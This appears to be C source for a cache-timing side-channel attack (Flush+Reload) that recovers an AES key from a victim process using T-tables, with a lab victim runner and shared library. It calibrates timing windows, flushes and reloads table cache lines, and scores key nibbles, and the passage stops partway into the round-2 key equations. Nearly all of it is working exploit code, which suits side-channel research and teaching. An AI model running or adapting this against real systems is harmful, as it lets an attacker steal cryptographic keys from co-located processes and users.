#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <immintrin.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>

#include "control_shared.h"

#define SHM_NAME "/aes_ttable_shm"
#define FIXED_ADDR ((void*)0x500000000000ULL)
#define TTABLE_SIZE 4096
#define CACHE_LINE_SIZE 64
#define TOTAL_LINES 64

#define ATTACKER_CPU_DEFAULT 2
#define VICTIM_CPU_DEFAULT 4
#define VICTIM_PROGRAM_DEFAULT "./victim_runner"
#define AES_LIBRARY_DEFAULT "./libaes.so"
#define OUT_KEY_DEFAULT "recovered_key_phased.txt"

#define PHASE1_CALIB_TRACES_DEFAULT 4000
#define PHASE2_REPEATS_DEFAULT 300
#define PHASE3_TRACES_DEFAULT 6000

//this percentile is a policy for the measured operation-cost guard.
//it is not a machine-specific timing multiplier.
#define OPERATION_DURATION_PERCENTILE_DEFAULT 75.0

//we only need to make sure round 2 is finished before the reload.
//there is no next-request timing constraint because the attacker
//waits for the response after its reload is complete.
#define ROUND2_RELOAD_PERCENTILE_DEFAULT 95.0

#define PRIMITIVE_CALIB_SAMPLES_DEFAULT 200


static const uint8_t base_plaintext[16] = {
    0x00,0x11,0x22,0x33,
    0x44,0x55,0x66,0x77,
    0x88,0x99,0xaa,0xbb,
    0xcc,0xdd,0xee,0xff
};

static uint64_t rng_state = 0x243f6a8885a308d3ULL;


//randomness
static uint64_t rng_next(void){
    uint64_t x=rng_state;
    x^=x<<13;
    x^=x>>7;
    x^=x<<17;
    rng_state=x;
    return x;
}

static void random_plaintext(uint8_t plaintext[16]){
    for(int i=0;i<16;i++){
        plaintext[i]=(uint8_t)rng_next();
    }
}

static void shuffle_order(int *order,int count){
    for(int i=0;i<count;i++){
        order[i]=i;
    }
    for(int i=count-1;i>0;i--){
        int j=(int)(rng_next()%(uint64_t)(i+1));
        int tmp=order[i];
        order[i]=order[j];
        order[j]=tmp;
    }
}


//error / argument / cpu / tsc
static void die(const char *message){
    perror(message);
    exit(EXIT_FAILURE);
}

static int parse_positive_int(const char *text,const char *name){
    char *end=NULL;
    long value=strtol(text,&end,10);

    if(text[0]=='\0'||end==text||*end!='\0'||value<=0||value>100000000L){
        fprintf(stderr,"[-] Invalid positive integer for %s: %s\n",name,text);
        exit(EXIT_FAILURE);
    }

    return (int)value;
}

static double parse_percentile(const char *text,const char *name){
    char *end=NULL;
    double value=strtod(text,&end);

    if(text[0]=='\0'||end==text||*end!='\0'||value<0.0||value>100.0){
        fprintf(stderr,"[-] Invalid percentile for %s: %s\n",name,text);
        exit(EXIT_FAILURE);
    }

    return value;
}

static void set_cpu(int cpu){
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu,&set);
    if(sched_setaffinity(0,sizeof(set),&set)==-1){die("sched_setaffinity");}
}

static inline uint64_t rdtsc_now(void){
    unsigned int aux;
    return __rdtscp(&aux);
}

static inline void busy_wait_until(uint64_t t0,uint64_t target_delta){
    while(rdtsc_now()-t0<target_delta){
        _mm_pause();
    }
}


//pipe read
static void read_exact(int fd,void *buffer,size_t length){
    uint8_t *ptr=(uint8_t *)buffer;
    while(length!=0){
        ssize_t received=read(fd,ptr,length);
        if(received<0){
            if(errno==EINTR)continue;
            die("read");
        }
        if(received==0){
            fprintf(stderr,"[-] Victim pipe closed.\n");
            exit(EXIT_FAILURE);
        }
        ptr+=(size_t)received;
        length-=(size_t)received;
    }
}


//flush + reload
static inline void flush_line(void *address){
    _mm_clflush(address);
}

static inline uint64_t reload_timing(void *address){
    unsigned int aux;
    uint64_t start;
    uint64_t end;

    _mm_lfence();
    start=__rdtscp(&aux);
    _mm_lfence();

    volatile uint8_t value=*(volatile uint8_t *)address;
    (void)value;

    _mm_lfence();
    end=__rdtscp(&aux);
    _mm_lfence();

    return end-start;
}

static inline void *line_address(void *ttable,int global_line){
    return (void *)((uintptr_t)ttable+(uintptr_t)global_line*CACHE_LINE_SIZE);
}

static void flush_all_lines(void *ttable){
    int order[TOTAL_LINES];
    shuffle_order(order,TOTAL_LINES);

    for(int i=0;i<TOTAL_LINES;i++){
        flush_line(line_address(ttable,order[i]));
    }
    _mm_mfence();
}

static inline double timing_signal(uint64_t miss_baseline,uint64_t observed){
    if(observed>=miss_baseline){
        return 0.0;
    }
    return (double)(miss_baseline-observed);
}

static void calibrate_miss_baseline(void *ttable,uint64_t baseline[TOTAL_LINES]){
    printf("\n[+] Calibrating Flush+Reload miss timing...\n");

    int order[TOTAL_LINES];
    shuffle_order(order,TOTAL_LINES);

    for(int i=0;i<TOTAL_LINES;i++){
        int line=order[i];
        void *address=line_address(ttable,line);
        uint64_t sum=0;

        for(int sample=0;sample<100;sample++){
            flush_line(address);
            _mm_mfence();
            sum+=reload_timing(address);
            flush_line(address);
            _mm_mfence();
        }

        baseline[line]=sum/100;
    }

    printf("[+] Miss baseline calibrated.\n");
}


//victim / shared memory
static void map_ttables(void **mapping){
    int fd=shm_open(SHM_NAME,O_RDWR,0666);
    if(fd==-1)die("shm_open T-tables");

    void *ptr=mmap(FIXED_ADDR,TTABLE_SIZE,PROT_READ|PROT_WRITE,MAP_SHARED|MAP_FIXED,fd,0);
    close(fd);
    if(ptr==MAP_FAILED)die("mmap T-tables");

    if(ptr!=FIXED_ADDR){
        fprintf(stderr,"[-] T-table mapping is not at %p\n",FIXED_ADDR);
        exit(EXIT_FAILURE);
    }

    *mapping=ptr;
}

static control_block_t *open_control_block(void){
    int fd=shm_open(CONTROL_SHM_NAME,O_RDWR,0666);
    if(fd==-1)die("shm_open control");

    void *ptr=mmap(NULL,sizeof(control_block_t),PROT_READ|PROT_WRITE,MAP_SHARED,fd,0);
    close(fd);
    if(ptr==MAP_FAILED)die("mmap control");

    return (control_block_t *)ptr;
}

static pid_t start_victim(const char *victim_program,const char *library_path,int victim_cpu){
    int child_to_parent[2];
    if(pipe(child_to_parent)==-1){die("pipe");}

    pid_t pid=fork();
    if(pid==-1)die("fork");

    if(pid==0){
        close(child_to_parent[0]);
        if(dup2(child_to_parent[1],STDOUT_FILENO)==-1){die("dup2");}
        close(child_to_parent[1]);

        char cpu_string[32];
        snprintf(cpu_string,sizeof(cpu_string),"%d",victim_cpu);

        execl(victim_program,victim_program,"0",library_path,cpu_string,(char *)NULL);

        perror("execl victim");
        _exit(EXIT_FAILURE);
    }

    close(child_to_parent[1]);

    char ready;
    read_exact(child_to_parent[0],&ready,1);
    close(child_to_parent[0]);

    if(ready!='R'){
        fprintf(stderr,"[-] Victim did not become ready.\n");
        kill(pid,SIGTERM);
        waitpid(pid,NULL,0);
        exit(EXIT_FAILURE);
    }

    return pid;
}

static uint32_t issue_request_async(control_block_t *control,uint8_t mode,const uint8_t plaintext[16]){
    uint32_t request=control->request_seq+1;
    control->mode=mode;

    for(int i=0;i<16;i++){
        control->plaintext[i]=plaintext[i];
    }

    _mm_mfence();
    control->request_seq=request;
    _mm_mfence();

    return request;
}

static void wait_for_response(control_block_t *control,uint32_t request){
    while(control->response_seq!=request){
        _mm_pause();
    }
    _mm_mfence();
}

static void run_victim_blocking(control_block_t *control,uint8_t mode,const uint8_t plaintext[16]){
    uint32_t request=issue_request_async(control,mode,plaintext);
    wait_for_response(control,request);
}

static void terminate_victim(control_block_t *control,pid_t pid){
    control->quit=1;
    _mm_mfence();
    control->request_seq=control->request_seq+1;
    _mm_mfence();

    waitpid(pid,NULL,0);
    munmap(control,sizeof(control_block_t));
}


//runtime calibration structures
typedef struct{
    uint64_t *round1_end_offset;
    uint64_t *round2_start_offset;
    uint64_t *round2_end_offset;
    uint64_t *round3_start_offset;
    int count;
} timing_profile_t;

typedef struct{
    uint64_t flush_all_p50;
    uint64_t flush_all_p75;
    uint64_t flush_all_guard;

    uint64_t reload_16_p50;
    uint64_t reload_16_p75;
    uint64_t reload_16_guard;

    uint64_t reload_64_p50;
    uint64_t reload_64_p75;
    uint64_t reload_64_typical_guard;
} primitive_profile_t;

typedef struct{
    uint64_t phase2_reload_window;
    uint64_t phase3_evict_window;
    uint64_t phase3_reload_window;
    uint64_t phase4_evict_window;

    double phase2_coverage_percent;
    double phase3_evict_coverage_percent;
    double phase3_reload_coverage_percent;
    double phase4_evict_coverage_percent;
} attack_windows_t;

typedef struct{
    uint64_t tsc;
    int delta;
} timing_event_t;


//sort / statistics
static int compare_u64(const void *a,const void *b){
    uint64_t aa=*(const uint64_t *)a;
    uint64_t bb=*(const uint64_t *)b;

    if(aa<bb)return -1;
    if(aa>bb)return 1;
    return 0;
}

static int compare_event(const void *a,const void *b){
    const timing_event_t *ea=(const timing_event_t *)a;
    const timing_event_t *eb=(const timing_event_t *)b;

    if(ea->tsc<eb->tsc)return -1;
    if(ea->tsc>eb->tsc)return 1;

    //start events are processed before end+1 events at the same timestamp.
    if(ea->delta>eb->delta)return -1;
    if(ea->delta<eb->delta)return 1;
    return 0;
}

static uint64_t percentile_u64(const uint64_t *values,int count,double percentile){
    if(count<=0)return 0;
    if(percentile<0.0)percentile=0.0;
    if(percentile>100.0)percentile=100.0;

    uint64_t *copy=malloc((size_t)count*sizeof(uint64_t));
    if(copy==NULL)die("malloc percentile");

    memcpy(copy,values,(size_t)count*sizeof(uint64_t));
    qsort(copy,(size_t)count,sizeof(uint64_t),compare_u64);

    double position=(percentile/100.0)*(double)(count-1);
    size_t index=(size_t)position;
    if((double)index<position){index++;}
    if(index>=(size_t)count){index=(size_t)count-1;}

    uint64_t result=copy[index];
    free(copy);

    return result;
}

static double mean_u64(const uint64_t *values,int count){
    unsigned __int128 sum=0;

    for(int i=0;i<count;i++){
        sum+=(unsigned __int128)values[i];
    }

    if(count==0)return 0.0;
    return (double)sum/(double)count;
}


//measure attacker operation costs
static uint64_t measure_flush_all_duration(void *ttable){
    uint64_t start=rdtsc_now();
    flush_all_lines(ttable);
    return rdtsc_now()-start;
}

static uint64_t measure_reload_duration(void *ttable,int line_count){
    //measure a conservative all-miss reload cost.
    //this is deliberately the same reload primitive used during the attack.
    flush_all_lines(ttable);

    int order[TOTAL_LINES];
    shuffle_order(order,line_count);

    uint64_t start=rdtsc_now();

    for(int i=0;i<line_count;i++){
        int line=order[i];
        (void)reload_timing(line_address(ttable,line));
    }

    return rdtsc_now()-start;
}

static void calibrate_attacker_primitives(void *ttable,int sample_count,double percentile,primitive_profile_t *profile){
    if(sample_count<=0)die("invalid primitive calibration count");

    uint64_t *flush_samples=calloc((size_t)sample_count,sizeof(uint64_t));
    uint64_t *reload16_samples=calloc((size_t)sample_count,sizeof(uint64_t));
    uint64_t *reload64_samples=calloc((size_t)sample_count,sizeof(uint64_t));

    if(flush_samples==NULL||reload16_samples==NULL||reload64_samples==NULL){
        free(flush_samples);
        free(reload16_samples);
        free(reload64_samples);
        die("calloc primitive calibration");
    }

    printf("\n[+] Measuring attacker-side Flush+Reload operation costs...\n");

    for(int i=0;i<sample_count;i++){
        flush_samples[i]=measure_flush_all_duration(ttable);
        reload16_samples[i]=measure_reload_duration(ttable,16);
        reload64_samples[i]=measure_reload_duration(ttable,TOTAL_LINES);
    }

    profile->flush_all_p50=percentile_u64(flush_samples,sample_count,50.0);
    profile->flush_all_p75=percentile_u64(flush_samples,sample_count,75.0);
    profile->flush_all_guard=percentile_u64(flush_samples,sample_count,percentile);

    profile->reload_16_p50=percentile_u64(reload16_samples,sample_count,50.0);
    profile->reload_16_p75=percentile_u64(reload16_samples,sample_count,75.0);
    profile->reload_16_guard=percentile_u64(reload16_samples,sample_count,percentile);

    profile->reload_64_p50=percentile_u64(reload64_samples,sample_count,50.0);
    profile->reload_64_p75=percentile_u64(reload64_samples,sample_count,75.0);
    profile->reload_64_typical_guard=percentile_u64(reload64_samples,sample_count,percentile);

    printf(
        "[+] Flush-all duration: mean=%.1f p50=%llu p75=%llu p%.1f=%llu cycles\n"
        "[+] Reload-16 duration: mean=%.1f p50=%llu p75=%llu p%.1f=%llu cycles\n"
        "[+] Reload-64 duration: mean=%.1f p50=%llu p75=%llu p%.1f=%llu cycles\n",

        mean_u64(flush_samples,sample_count),
        (unsigned long long)profile->flush_all_p50,
        (unsigned long long)profile->flush_all_p75,
        percentile,
        (unsigned long long)profile->flush_all_guard,

        mean_u64(reload16_samples,sample_count),
        (unsigned long long)profile->reload_16_p50,
        (unsigned long long)profile->reload_16_p75,
        percentile,
        (unsigned long long)profile->reload_16_guard,

        mean_u64(reload64_samples,sample_count),
        (unsigned long long)profile->reload_64_p50,
        (unsigned long long)profile->reload_64_p75,
        percentile,
        (unsigned long long)profile->reload_64_typical_guard
    );

    free(flush_samples);
    free(reload16_samples);
    free(reload64_samples);
}


//victim timing calibration
static void calibrate_phase_timing(control_block_t *control,int calibration_traces,timing_profile_t *profile){
    printf(
        "\n============================================================\n"
        "                  PHASE 1: TIMING CALIBRATION\n"
        "============================================================\n"
        "[+] Oracle library build: AES_SLEEP_MODE %s\n"
        "[+] Collecting %d calibration requests.\n",

        control->sleep_mode_active?"ENABLED":"disabled",
        calibration_traces
    );

    profile->count=calibration_traces;

    profile->round1_end_offset=calloc((size_t)calibration_traces,sizeof(uint64_t));
    profile->round2_start_offset=calloc((size_t)calibration_traces,sizeof(uint64_t));
    profile->round2_end_offset=calloc((size_t)calibration_traces,sizeof(uint64_t));
    profile->round3_start_offset=calloc((size_t)calibration_traces,sizeof(uint64_t));

    if(profile->round1_end_offset==NULL||profile->round2_start_offset==NULL||profile->round2_end_offset==NULL||profile->round3_start_offset==NULL){
        free(profile->round1_end_offset);
        free(profile->round2_start_offset);
        free(profile->round2_end_offset);
        free(profile->round3_start_offset);
        die("calloc timing profile");
    }

    uint64_t *r1_duration=calloc((size_t)calibration_traces,sizeof(uint64_t));
    uint64_t *r2_duration=calloc((size_t)calibration_traces,sizeof(uint64_t));
    uint64_t *gap12_duration=calloc((size_t)calibration_traces,sizeof(uint64_t));
    uint64_t *gap23_duration=calloc((size_t)calibration_traces,sizeof(uint64_t));

    if(r1_duration==NULL||r2_duration==NULL||gap12_duration==NULL||gap23_duration==NULL){
        free(r1_duration);
        free(r2_duration);
        free(gap12_duration);
        free(gap23_duration);
        die("calloc timing statistics");
    }

    for(int i=0;i<calibration_traces;i++){
        uint8_t plaintext[16];
        random_plaintext(plaintext);

        uint64_t t0=rdtsc_now();

        run_victim_blocking(control,CONTROL_MODE_ROUND3_NOFLUSH,plaintext);

        uint64_t r1_end=control->round1_end_tsc;
        uint64_t r2_start=control->round2_start_tsc;
        uint64_t r2_end=control->round2_end_tsc;
        uint64_t r3_start=control->round3_start_tsc;

        if(r1_end<=t0||r2_start<=r1_end||r2_end<=r2_start||r3_start<=r2_end){
            free(r1_duration);
            free(r2_duration);
            free(gap12_duration);
            free(gap23_duration);
            die("invalid victim timing calibration sample");
        }

        profile->round1_end_offset[i]=r1_end-t0;
        profile->round2_start_offset[i]=r2_start-t0;
        profile->round2_end_offset[i]=r2_end-t0;
        profile->round3_start_offset[i]=r3_start-t0;

        r1_duration[i]=r1_end-control->round1_start_tsc;
        r2_duration[i]=r2_end-r2_start;
        gap12_duration[i]=r2_start-r1_end;
        gap23_duration[i]=r3_start-r2_end;

        if((i+1)%500==0||i+1==calibration_traces){
            printf("\r[+] Calibration traces: %d/%d",i+1,calibration_traces);
            fflush(stdout);
        }
    }

    printf("\n");

    printf(
        "[+] Round-1 T-table duration: mean=%.1f p50=%llu p95=%llu cycles\n"
        "[+] Inter-round (1->2) non-T-table gap: mean=%.1f p50=%llu p95=%llu cycles\n"
        "[+] Round-2 T-table duration: mean=%.1f p50=%llu p95=%llu cycles\n"
        "[+] Inter-round (2->3) non-T-table gap: mean=%.1f p50=%llu p95=%llu cycles\n",

        mean_u64(r1_duration,calibration_traces),
        (unsigned long long)percentile_u64(r1_duration,calibration_traces,50.0),
        (unsigned long long)percentile_u64(r1_duration,calibration_traces,95.0),

        mean_u64(gap12_duration,calibration_traces),
        (unsigned long long)percentile_u64(gap12_duration,calibration_traces,50.0),
        (unsigned long long)percentile_u64(gap12_duration,calibration_traces,95.0),

        mean_u64(r2_duration,calibration_traces),
        (unsigned long long)percentile_u64(r2_duration,calibration_traces,50.0),
        (unsigned long long)percentile_u64(r2_duration,calibration_traces,95.0),

        mean_u64(gap23_duration,calibration_traces),
        (unsigned long long)percentile_u64(gap23_duration,calibration_traces,50.0),
        (unsigned long long)percentile_u64(gap23_duration,calibration_traces,95.0)
    );

    printf(
        "[+] Request -> round-1 end: p50=%llu p95=%llu p99=%llu cycles\n"
        "[+] Request -> round-2 start: p50=%llu p95=%llu p99=%llu cycles\n"
        "[+] Request -> round-2 end: p50=%llu p95=%llu p99=%llu cycles\n"
        "[+] Request -> round-3 start: p50=%llu p95=%llu p99=%llu cycles\n",

        (unsigned long long)percentile_u64(profile->round1_end_offset,calibration_traces,50.0),
        (unsigned long long)percentile_u64(profile->round1_end_offset,calibration_traces,95.0),
        (unsigned long long)percentile_u64(profile->round1_end_offset,calibration_traces,99.0),

        (unsigned long long)percentile_u64(profile->round2_start_offset,calibration_traces,50.0),
        (unsigned long long)percentile_u64(profile->round2_start_offset,calibration_traces,95.0),
        (unsigned long long)percentile_u64(profile->round2_start_offset,calibration_traces,99.0),

        (unsigned long long)percentile_u64(profile->round2_end_offset,calibration_traces,50.0),
        (unsigned long long)percentile_u64(profile->round2_end_offset,calibration_traces,95.0),
        (unsigned long long)percentile_u64(profile->round2_end_offset,calibration_traces,99.0),

        (unsigned long long)percentile_u64(profile->round3_start_offset,calibration_traces,50.0),
        (unsigned long long)percentile_u64(profile->round3_start_offset,calibration_traces,95.0),
        (unsigned long long)percentile_u64(profile->round3_start_offset,calibration_traces,99.0)
    );

    free(r1_duration);
    free(r2_duration);
    free(gap12_duration);
    free(gap23_duration);
}


/*
 * automatic safe-window search
 *
 * For each calibration trace:
 *
 *   safe start <= round-2 start - operation duration
 *
 * and:
 *
 *   safe start >= round-1 end
 *
 * The best fixed start time is the timestamp contained in the
 * largest number of those safe intervals.
 *
 * The same construction is reused verbatim for the round-2/round-3
 * window: substitute round2_end for round1_end, and round3_start
 * for round2_start.
 */

static double choose_best_safe_window(const uint64_t *left,const uint64_t *right,int count,uint64_t *out_window){
    timing_event_t *events=calloc((size_t)count*2,sizeof(timing_event_t));
    if(events==NULL)die("calloc window events");

    int event_count=0;

    for(int i=0;i<count;i++){
        if(right[i]<left[i]){
            continue;
        }

        events[event_count].tsc=left[i];
        events[event_count].delta=+1;
        event_count++;

        //the interval includes 'right', therefore remove it at right + 1.
        events[event_count].tsc=right[i]+1;
        events[event_count].delta=-1;
        event_count++;
    }

    if(event_count==0){
        *out_window=percentile_u64(left,count,50.0);
        free(events);
        return 0.0;
    }

    qsort(events,(size_t)event_count,sizeof(timing_event_t),compare_event);

    int active=0;
    int best_active=0;
    uint64_t best_time=events[0].tsc;
    int position=0;

    while(position<event_count){
        uint64_t current_time=events[position].tsc;

        while(position<event_count&&events[position].tsc==current_time){
            active+=events[position].delta;
            position++;
        }

        if(active>best_active){
            best_active=active;
            best_time=current_time;
        }
    }

    free(events);

    *out_window=best_time;

    return 100.0*(double)best_active/(double)count;
}

static attack_windows_t choose_attack_windows(const timing_profile_t *timing,const primitive_profile_t *primitive,double round2_reload_percentile){
    attack_windows_t windows;

    uint64_t *phase2_right=calloc((size_t)timing->count,sizeof(uint64_t));
    uint64_t *phase3_evict_right=calloc((size_t)timing->count,sizeof(uint64_t));
    uint64_t *phase4_evict_right=calloc((size_t)timing->count,sizeof(uint64_t));

    if(phase2_right==NULL||phase3_evict_right==NULL||phase4_evict_right==NULL){
        free(phase2_right);
        free(phase3_evict_right);
        free(phase4_evict_right);
        die("calloc window bounds");
    }

    for(int i=0;i<timing->count;i++){
        if(timing->round2_start_offset[i]>=primitive->reload_16_guard){
            phase2_right[i]=timing->round2_start_offset[i]-primitive->reload_16_guard;
        } else {
            phase2_right[i]=0;
        }

        if(timing->round2_start_offset[i]>=primitive->flush_all_guard){
            phase3_evict_right[i]=timing->round2_start_offset[i]-primitive->flush_all_guard;
        } else {
            phase3_evict_right[i]=0;
        }

        //round-2/round-3 window: mirrors the phase3_evict_right construction
        //above, one round later (round2_end in place of round1_end's role,
        //round3_start in place of round2_start's role).
        if(timing->round3_start_offset[i]>=primitive->flush_all_guard){
            phase4_evict_right[i]=timing->round3_start_offset[i]-primitive->flush_all_guard;
        } else {
            phase4_evict_right[i]=0;
        }
    }

    windows.phase2_coverage_percent=choose_best_safe_window(timing->round1_end_offset,phase2_right,timing->count,&windows.phase2_reload_window);
    windows.phase3_evict_coverage_percent=choose_best_safe_window(timing->round1_end_offset,phase3_evict_right,timing->count,&windows.phase3_evict_window);

    windows.phase3_reload_window=percentile_u64(timing->round2_end_offset,timing->count,round2_reload_percentile);

    //round-2/round-3 eviction window: same construction as
    //phase3_evict_window, using round2_end as the left bound (the
    //earliest safe point, mirroring round1_end above) and
    //phase4_evict_right as the right bound (mirroring phase3_evict_right).
    windows.phase4_evict_coverage_percent=choose_best_safe_window(timing->round2_end_offset,phase4_evict_right,timing->count,&windows.phase4_evict_window);

    int reload_after_count=0;

    for(int i=0;i<timing->count;i++){
        if(timing->round2_end_offset[i]<=windows.phase3_reload_window){
            reload_after_count++;
        }
    }

    windows.phase3_reload_coverage_percent=100.0*(double)reload_after_count/(double)timing->count;

    free(phase2_right);
    free(phase3_evict_right);
    free(phase4_evict_right);

    return windows;
}

static void free_timing_profile(timing_profile_t *profile){
    free(profile->round1_end_offset);
    free(profile->round2_start_offset);
    free(profile->round2_end_offset);
    free(profile->round3_start_offset);

    profile->round1_end_offset=NULL;
    profile->round2_start_offset=NULL;
    profile->round2_end_offset=NULL;
    profile->round3_start_offset=NULL;

    profile->count=0;
}

static void print_attack_windows(const attack_windows_t *windows,const primitive_profile_t *primitive,double operation_percentile,double round2_reload_percentile){
    printf(
        "\n============================================================\n"
        "               AUTOMATIC WINDOW SELECTION\n"
        "============================================================\n"
    );

    printf("[+] Window guards use measured p%.1f attacker-operation durations.\n",operation_percentile);

    printf(
        "[+] Flush-all guard: %llu cycles\n"
        "[+] Reload-16 guard: %llu cycles\n"
        "[+] Reload-64 benchmark: %llu cycles\n",

        (unsigned long long)primitive->flush_all_guard,
        (unsigned long long)primitive->reload_16_guard,
        (unsigned long long)primitive->reload_64_typical_guard
    );

    printf(
        "[+] Phase 2 reload window: %llu cycles after request\n"
        "    predicted safe calibration traces: %.1f%%\n",

        (unsigned long long)windows->phase2_reload_window,
        windows->phase2_coverage_percent
    );

    printf(
        "[+] Phase 3 evict window (round1->round2): %llu cycles after request\n"
        "    predicted safe calibration traces: %.1f%%\n",

        (unsigned long long)windows->phase3_evict_window,
        windows->phase3_evict_coverage_percent
    );

    printf(
        "[+] Phase 3 reload window: %llu cycles after request\n"
        "    round-2 completion coverage at p%.1f: %.1f%%\n",

        (unsigned long long)windows->phase3_reload_window,
        round2_reload_percentile,
        windows->phase3_reload_coverage_percent
    );

    printf(
        "[+] Phase 4 evict window (round2->round3): %llu cycles after request\n"
        "    predicted safe calibration traces: %.1f%%\n",

        (unsigned long long)windows->phase4_evict_window,
        windows->phase4_evict_coverage_percent
    );

    if(windows->phase2_coverage_percent<50.0){
        printf("[!] Phase 2 has no strong stable timing window on this run.\n");
    }

    if(windows->phase3_evict_coverage_percent<50.0){
        printf(
            "[!] Phase 3 has no strong stable inter-round (1->2) eviction window on this run.\n"
            "    The no-sleep build can legitimately fail here because the natural\n"
            "    gap is shorter than the measured Flush+Reload operation.\n"
        );
    }

    if(windows->phase4_evict_coverage_percent<50.0){
        printf(
            "[!] Phase 4 has no strong stable inter-round (2->3) eviction window on this run.\n"
            "    This does not affect key recovery (round 3 is not used for recovery),\n"
            "    but it means the round2->round3 window could not be reliably isolated.\n"
        );
    }
}


//phase 2 -- round-1 window
static int recover_high_nibble_windowed(int byte_index,void *ttable,control_block_t *control,uint64_t baseline[TOTAL_LINES],uint64_t window,int repeat_count){
    int table=byte_index%4;
    int table_base=table*16;

    double delta[16][16];
    memset(delta,0,sizeof(delta));

    for(int p_high=0;p_high<16;p_high++){
        uint8_t plaintext[16];
        memcpy(plaintext,base_plaintext,16);
        plaintext[byte_index]=(uint8_t)(p_high<<4);

        for(int repeat=0;repeat<repeat_count;repeat++){
            flush_all_lines(ttable);

            uint64_t t0=rdtsc_now();

            uint32_t request=issue_request_async(control,CONTROL_MODE_ROUND3_NOFLUSH,plaintext);

            busy_wait_until(t0,window);

            int order[16];
            shuffle_order(order,16);

            for(int i=0;i<16;i++){
                int local_line=order[i];
                int global_line=table_base+local_line;

                uint64_t observed=reload_timing(line_address(ttable,global_line));

                delta[p_high][local_line]+=timing_signal(baseline[global_line],observed);
            }

            //the victim is allowed to finish naturally (through round 3).
            wait_for_response(control,request);
        }

        for(int local_line=0;local_line<16;local_line++){
            delta[p_high][local_line]/=(double)repeat_count;
        }
    }

    double scores[16];
    memset(scores,0,sizeof(scores));

    for(int key_high=0;key_high<16;key_high++){
        for(int p_high=0;p_high<16;p_high++){
            scores[key_high]+=delta[p_high][p_high^key_high];
        }
    }

    int best=0;

    for(int key_high=1;key_high<16;key_high++){
        if(scores[key_high]>scores[best]){
            best=key_high;
        }
    }

    printf("byte %2d | T%d | K_high = 0x%X | score = %.2f\n",byte_index,table,best,scores[best]);

    return best;
}


//round-2 equations
static const uint8_t Sbox2[256] = {
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16
};

static inline uint8_t gf_mul2(uint8_t x){
    return (uint8_t)((x<<1)^((x&0x80)?0x1b:0x00));
}

static inline uint8_t gf_mul3(uint8_t x){
    return gf_mul2(x)^x;
}

static int predict_group_T2(const uint8_t p[16],const uint8_t high[16],int k0_low,int k5_low,int k10_low,int k15_low){
    uint8_t k0=(uint8_t)((high[0]<<4)|k0_low);
    uint8_t k5=(uint8_t)((high[5]<<4)|k5_low);
    uint8_t k10=(uint8_t)((high[10]<<4)|k10_low);
    uint8_t k15=(uint8_t)((high[15]<<4)|k15_low);
    uint8_t k2=(uint8_t)(high[2]<<4);

    uint8_t x=Sbox2[p[0]^k0]^Sbox2[p[5]^k5]^gf_mul2(Sbox2[p[10]^k10])^gf_mul3(Sbox2[p[15]^k15])^Sbox2[k15]^k2;

    return x>>4;
}

static int predict_group_T1(const uint8_t p[16],const uint8_t high[16],int k3_low,int k4_low,int k9_low,int k14_low){
    uint8_t k3=(uint8_t)((high[3]<<4)|k3_low);
    uint8_t k4=(uint8_t)((high[4]<<4)|k4_low);
    uint8_t k9=(uint8_t)((high[9]<<4)|k9_low);
    uint8_t k14=(uint8_t)((high[14]<<4)|k14_low);
    uint8_t k1=(uint8_t)(high[1]<<4);
    uint8_t k5=(uint8_t)(high[5]<<4);

    uint8_t x=Sbox2[p[4]^k4]^gf_mul2(Sbox2[p[9]^k9])^gf_mul3(Sbox2[p[14]^k14])^Sbox2[p[3]^k3]^k1^k5^Sbox2[k14];

    return x>>4;
}

static int predict_group_T0(const uint8_t p[16],const uint8_t high[16],int k2_low,int k7_low,int k8_low,int k13_low){
    uint8_t k2=(uint8_t)((high[2]<<4)|k2_low);
    uint8_t k7=(uint8_t)((high[7]<<4)|k7_low);
    uint8_t k8=(uint8_t)((high[8]<<4)|k8_low);
    uint8_t k13=(uint8_t)((high[13]<<4)|k13_low);
    uint8_t k4=(uint8_t)(high[4]<<4);
